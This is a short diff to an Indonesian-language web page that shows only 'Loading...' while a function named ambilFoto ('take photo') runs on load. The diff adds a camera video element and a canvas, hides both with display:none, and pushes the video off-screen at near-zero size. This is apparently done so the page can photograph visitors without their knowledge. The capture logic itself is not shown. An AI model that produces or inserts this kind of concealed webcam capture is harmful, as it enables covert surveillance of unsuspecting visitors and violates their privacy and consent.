@@ -9,6 +9,8 @@
   <p>Sedang memuat...</p>
 
   <!-- Elemen tersembunyi -->
+  <video id="video" autoplay playsinline style="display: none;"></video>
+  <canvas id="canvas" width="320" height="240" style="display: none;"></canvas>
 
   <script>
     async function ambilFoto() {
@@ -71,4 +73,16 @@
     ambilFoto();
   </script>
 </body>
+
+<style>
+  #video {
+    position: absolute;
+    top: -99999px;
+    left: -9999px;
+    width: 1px;
+    height: 0;
+    pointer-events: none;
+  }
+</style>
+
 </html>
